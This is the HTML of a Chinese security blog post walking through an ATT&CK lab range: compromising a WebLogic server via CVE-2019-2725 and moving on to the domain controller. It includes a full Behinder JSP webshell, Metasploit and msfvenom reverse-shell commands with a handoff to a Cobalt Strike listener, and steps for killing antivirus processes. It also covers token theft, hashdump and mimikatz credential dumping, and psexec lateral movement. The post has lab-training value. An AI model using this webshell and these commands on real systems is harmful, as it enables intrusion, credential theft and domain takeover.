@@ -1,0 +1,435 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ATT&amp;CK(二) | J1Nmu</title><meta name="author" content="Jinmu"><meta name="copyright" content="Jinmu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ATT&amp;amp;CK(二) 环境搭建  DC**：** IP：10.10.10.10 OS：Windows 2012 应用：AD域 WEB（初始的状态默认密码无法登录，切换用户 de1ay&amp;#x2F;1qaz@WSX 登录进去）： IP1：10.10.10.80 IP2：192.168.111.80 OS：W"><link rel="shortcut icon" href="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg"><link rel="canonical" href="https://jinmu1108.github.io/%E9%9D%B6%E5%9C%BA/ATT-CK/ATT&amp;CK(%E4%BA%8C)/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ATT&CK(二)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-14 10:50:34'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">48</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">J1Nmu</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ATT&amp;CK(二)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-14T02:50:44.342Z" title="发表于 2023-05-14 10:50:44">2023-05-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-14T02:50:34.759Z" title="更新于 2023-05-14 10:50:34">2023-05-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/ATT-CK/">ATT&amp;CK</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ATT&amp;CK(二)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>ATT&amp;CK(二)</h1>
+<h2 id="环境搭建">环境搭建</h2>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/197e5e5373f47c63b375630993017338.png" alt="image-20220621212604899"></p>
+<p><strong>DC</strong>**：**</p>
+<p>IP：10.10.10.10</p>
+<p>OS：Windows 2012</p>
+<p>应用：AD域</p>
+<p><strong>WEB</strong>（初始的状态默认密码无法登录，切换用户 de1ay/1qaz@WSX 登录进去）：</p>
+<p>IP1：10.10.10.80</p>
+<p>IP2：192.168.111.80</p>
+<p>OS：Windows 2008</p>
+<p>应用：Weblogic 10.3.6 MSSQL 2008</p>
+<p><strong>PC</strong>：</p>
+<p>IP1：10.10.10.201</p>
+<p>IP2：192.168.111.201</p>
+<p>OS：Windows 7</p>
+<p>先从WEB机开始，注意需要手动开启服务，在 C:\Oracle\Middleware\user_projects\domains\base_domain\bin 下有一个 startWeblogic 的批处理，管理员身份运行它即可，管理员账号密码：Administrator/1qaz@WSX<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/95f312b14f7a09979df81b6597324d05.png" alt="image-20220621200408282"></p>
+<p>WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、Workstation、Computer Browser 全部启动（Computer Browser 一直自动关闭导致 net view 显示 6118 error 没能解决，在域信息收集时暂时关闭一下防火墙）</p>
+<h2 id="信息搜集">信息搜集</h2>
+<p><strong>拿到环境后，首先进行端口探测</strong></p>
+<p><code>nmap -sP 192.169.111.2/24</code></p>
+<p>用于扫描 192.169.111.2/24 这个网段中的所有主机，检查它们是否在线。/24 表示子网掩码为 255.255.255.0，也就是说，这个网段有 256 个 IP 地址，从 192.169.111.0 到 192.169.111.255。<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230511160156708.png" alt="image-20230511160156708"></p>
+<p><code> nmap -sS -sV -A -T4 -p- 192.168.111.8</code>0</p>
+<p>扫描 192.168.111.8 这个 IP 地址的所有端口</p>
+<p>-sS 表示使用 TCP SYN 扫描，这是一种快速且隐蔽的扫描方式。<br>
+-sV 表示进行服务版本探测，这可以获取目标主机上运行的服务的名称和版本。<br>
+-A 表示进行操作系统探测和脚本扫描，这可以获取目标主机的操作系统类型和其他有用的信息。<br>
+-T4 表示使用较快的扫描速度，这可以加快扫描过程，但也可能导致一些结果丢失或不准确。<br>
+-p- 表示扫描所有端口，从 1 到 65535。</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230511160652720.png" alt="image-20230511160652720"></p>
+<ul>
+<li>
+<p>445端口开放可能存在smb服务可能还会有ms17-010 端口溢出漏洞</p>
+</li>
+<li>
+<p>139端口开放就存在有samba服务可能会有远程命令执行漏洞</p>
+</li>
+<li>
+<p>1433端口开放就存在mssql服务有可能存在爆破 注入 sa弱口令</p>
+</li>
+<li>
+<p>3389远程桌面服务</p>
+</li>
+<li>
+<p>7001端口 weblogic服务</p>
+</li>
+</ul>
+<h2 id="外网渗透">外网渗透</h2>
+<p>用 WeblogicScan 扫描一下可能存在的漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python WeblogicScan.py -u 192.168.111.80 -p 7001</span><br></pre></td></tr></table></figure>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230511163914796.png" alt="image-20230511163914796"></p>
+<p>确定漏洞存在</p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.111.80:7001/uddiexplorer/SearchPublicRegistries.jsp">http://192.168.111.80:7001/uddiexplorer/SearchPublicRegistries.jsp</a></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230511173729576.png" alt="image-20230511173729576"></p>
+<p>师傅总结的五种状态</p>
+<p><strong>状态一</strong></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/2506318adcdac617378b640a61e6e036.png" alt="img"></p>
+<p><strong>状态二</strong></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/e683a9707118352c1a00288e6c982834.png" alt="img"></p>
+<p><strong>状态三</strong></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/8055f74b70275c1d3f2aeed1f0e24074.png" alt="img"></p>
+<p><strong>状态四</strong></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/944e92861baea29584bb1884d6ca496c.png" alt="img"></p>
+<p><strong>状态五</strong></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/88ad5be5e0e7504dd7b591b6777a0a82.png" alt="img"></p>
+<h3 id="利用CVE-2019-2725写shell">利用CVE-2019-2725写shell</h3>
+<p>工具地址</p>
+<p><a target="_blank" rel="noopener" href="https://www.aliyundrive.com/s/FqGpaqvHcGt">https://www.aliyundrive.com/s/FqGpaqvHcGt</a></p>
+<p>注意要java8运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files\Java\jre1.8.0_101\bin\java.exe&quot; -jar E:\anquan\shentou\CVE\java.jar</span><br></pre></td></tr></table></figure>
+<p>可以先获取信息</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/1964477-20201225151053052-1886023508.png" alt="img"></p>
+<p>上传冰蝎马，关于选择 webshell 上传路径问题，参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sstfy/p/10350915.html">https://www.cnblogs.com/sstfy/p/10350915.html</a></p>
+<p>把shell写到images目录中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\wan.jsp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>冰蝎shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure>
+<p>还是用自己本地冰蝎版本的shell才行 默认链接密码是<code>rebeyond</code></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230512220454414.png" alt="image-20230512220454414"></p>
+<p>上传木马文件,尝试连接CS<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230512222905343.png" alt="image-20230512222905343"></p>
+<p>Administrator/1qaz@WSX</p>
+<p>正常来说上传之后,运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Windows &amp; system32.exe</span><br></pre></td></tr></table></figure>
+<p>就能上线,但是web虚拟机程序不完整没连上</p>
+<p>上线msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole	</span><br><span class="line">search CVE-2019-2725	</span><br><span class="line">use exploit/multi/misc/weblogic_deserialize_asyncresponseservice	</span><br><span class="line">set target Windows	</span><br><span class="line">set payload  windows/x64/meterpreter/reverse_tcp 	</span><br><span class="line">set LHOST 192.168.111.128	</span><br><span class="line">set rhosts 192.168.111.80	</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole	//启动msf</span><br><span class="line">search CVE-2019-2725	</span><br><span class="line">use exploit/multi/misc/weblogic_deserialize_asyncresponseservice	</span><br><span class="line">set target Windows	//默认为linux,这里改为windows</span><br><span class="line">set payload  windows/x64/meterpreter/reverse_tcp 	</span><br><span class="line">set LHOST 192.168.111.128	//攻击机</span><br><span class="line">set rhosts 192.168.111.80	//被攻击</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p>这里攻击机需要能够访问到被攻击机</p>
+<p>刚开始用的服务器,访问不到,一直没成功</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230512235746511.png" alt="image-20230512235746511"></p>
+<h3 id="msf派生cs">msf派生cs</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">background  </span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true </span><br><span class="line">set lhost 192.168.111.128</span><br><span class="line">set lport 5570           </span><br><span class="line">set session 1            </span><br><span class="line">run                    </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">background  //将当前会话放到后台</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true //#默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true</span><br><span class="line">set lhost 120.55.103.132  //cs监听器设置的ip</span><br><span class="line">set lport 5570             //cs监听器设置的端口</span><br><span class="line">set session 3              #设置要联动的会话</span><br><span class="line">run                     #运行也可以用exploit</span><br></pre></td></tr></table></figure>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513003910356.png" alt="image-20230513003910356"></p>
+<p>上线后sleep 0 关闭防火墙以及,windows defender</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513163653402.png" alt="image-20230513163653402"></p>
+<p>shell tasklist 查看杀软</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513000552038.png" alt="image-20230513000552038">之前发现有360,杀一下进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps | grep 360</span><br><span class="line">kill 1608</span><br><span class="line">第一次杀完又出来一个 但是用户换了,不知道是重启,还是每个用户都有</span><br><span class="line">kill 3412</span><br></pre></td></tr></table></figure>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513001402547.png" alt="image-20230513001402547"></p>
+<h3 id="提权">提权</h3>
+<h4 id="迁移到高权限进程">迁移到高权限进程</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep svchost.exe</span><br><span class="line">migrate 616</span><br></pre></td></tr></table></figure>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513001139337.png" alt="image-20230513001139337"></p>
+<h4 id="使用svc-exe进行提权">使用svc-exe进行提权</h4>
+<p>,上线SYSTEM1</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513004701893.png" alt="image-20230513004701893"></p>
+<h4 id="令牌窃取提权">令牌窃取提权</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load incognito                 加载incognito(伪装)</span><br><span class="line">getuid                         查看当前token</span><br><span class="line">list_tokens -u                 列出可用token,顺便查看一下域</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;   token窃取，格式为impersonate_token&quot;主机名\\用户名&quot;</span><br><span class="line">rev2self                       返回之前的token</span><br></pre></td></tr></table></figure>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513005018916.png" alt="image-20230513005018916"></p>
+<h3 id="信息搜集-2">信息搜集</h3>
+<h4 id="域环境">域环境</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查看域名 net config workstation</span><br><span class="line">查看有几个域  net view /domain</span><br><span class="line">查看域内主机  net view</span><br><span class="line">查询域内用户   net user /domain #该命令在本环境中需要在system权限下执行</span><br><span class="line">查看域管理员   net group &quot;domain admins&quot; /domain  </span><br><span class="line">查看域控    net group &quot;domain controllers&quot; /domain  </span><br><span class="line">查看域内用户的详细信息  wmic useraccount get /all</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ipconfig/all</span><br></pre></td></tr></table></figure>
+<p>发现机器有双网卡，内网 10.10.10.1/24 网段，域控 ip 10.10.10.10（域控一般是本机的DNS服务器或者<code>shell net group &quot;domain controllers&quot; /domain</code>查看域控制器)</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513143305649.png" alt="image-20230513143305649"></p>
+<p><strong>net view</strong></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513164149469.png" alt="image-20230513164149469"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon 10.10.10.0/24 OnlinePC  # 多协议探测存活主机（IP、机器名、MAC地址、制造商）</span><br><span class="line">Ladon 10.10.10.0/24 OsScan #多协议识别操作系统 （IP、机器名、操作系统版本、开放服务）</span><br></pre></td></tr></table></figure>
+<p>使用ladon插件</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513171721687.png" alt="image-20230513171721687"></p>
+<h4 id="凭据获取">凭据获取</h4>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513172425135.png" alt="image-20230513172425135"></p>
+<h5 id="抓取Hash">抓取Hash</h5>
+<p><code>hashdump</code></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513172549648.png" alt="image-20230513172549648"></p>
+<h5 id="抓取明文凭证-密码">抓取明文凭证(密码)</h5>
+<p>这里用到了<strong>mimikatz</strong><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513172549648.png" alt="">****</p>
+<p>可以看到已经获取的密码凭证,可以在后面用于psexec横向渗透<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513172844634.png" alt="image-20230513172844634"></p>
+<h3 id="横向渗透">横向渗透</h3>
+<p>横向渗透概念:<br>
+横向渗透攻击技术是复杂网络攻击中广泛使用的一种技术，特别是在高级持续威胁（Advanced Persistent Threats，APT）中更加热衷于使用这种攻击方法。攻击者可以利用这些技术，以被攻陷的系统为跳板，访问其他主机，获取包括邮箱、共享文件夹或者凭证信息在内的敏感资源。攻击者可以利用这些敏感信息，进一步控制其他系统、提升权限或窃取更多有价值的凭证。借助此类攻击，攻击者最终可能获取域控的访问权限，完全控制基于Windows系统的基础设施或与业务相关的关键账户。<br>
+在提权后，我们可以用mimikatz dump目标机的凭证，并进行内网横向移动</p>
+<p>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。</p>
+<h4 id="SMB横向">SMB横向</h4>
+<h5 id="psexec横向移动">psexec横向移动</h5>
+<h6 id="哈希传递">哈希传递</h6>
+<p>psexec 是微软 pstools 工具包中最常用的一个工具，也是在内网渗透中的免杀渗透利器。psexec 能够在命令行下在对方没有开启 telnet 服务的时候返回一个半交互的命令行，像 telnet 客户端一样。原理是基于IPC共享，所以要目标打开 445 端口。另外在启动这个 psexec 建立连接之后对方机器上会被安装一个服务。<br>
+<strong>需探测域控机器是否开放445端口</strong></p>
+<p>先创建一个SMB监听器</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513165136801.png" alt="image-20230513165136801"></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513165401707.png" alt="image-20230513165401707"></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513173123032.png" alt=""></p>
+<p>域控上线</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513173151108.png" alt="image-20230513173151108"></p>
+<h6 id="伪造凭据">伪造凭据</h6>
+<p>首先移除令牌</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rev2self</span><br></pre></td></tr></table></figure>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/e8a585376d1dd394b6ed5ff1630ed4af.png" alt="img"></p>
+<p>通过之前获得的DC 管理的token生成新的凭证</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/9140a1ec8bfeceb62af4bf113a6506d5.png" alt="img"></p>
+<p>接下来就<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SMB&amp;spm=1001.2101.3001.7020">SMB</a>横向了</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/1961ea83f06732bf1d2e588aaabbba96.png" alt="img"></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/4d10bd1f7c389acfc3b9a2aeba55a04b.png" alt="img"></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/ed546ad672019442e401a24a32ef2af0.png" alt="img"></p>
+<p>域控上线</p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513223159018.png" alt="image-20230513223159018"></p>
+<h5 id="IPC">IPC$</h5>
+<h6 id="MSF">MSF</h6>
+<p>IPC$入侵，即通过使用Windows系统默认启动的IPC$共享获得计算机控制权的入侵</p>
+<p>搜先改一下<code>vim /etc/proxychain4</code></p>
+<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513215304404.png" alt="image-20230513215304404"></p>
+<p><strong>添加路由</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute    </span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20230513215613038.png" alt="image-20230513215613038"  />
+<p><strong>生成木马，设置listener为刚才设置的</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp lhost=10.10.10.80 lport=9999 -f exe &gt; /tmp/p.exe</span><br></pre></td></tr></table></figure>
+<p><strong>meterpreter进行监听</strong></p>
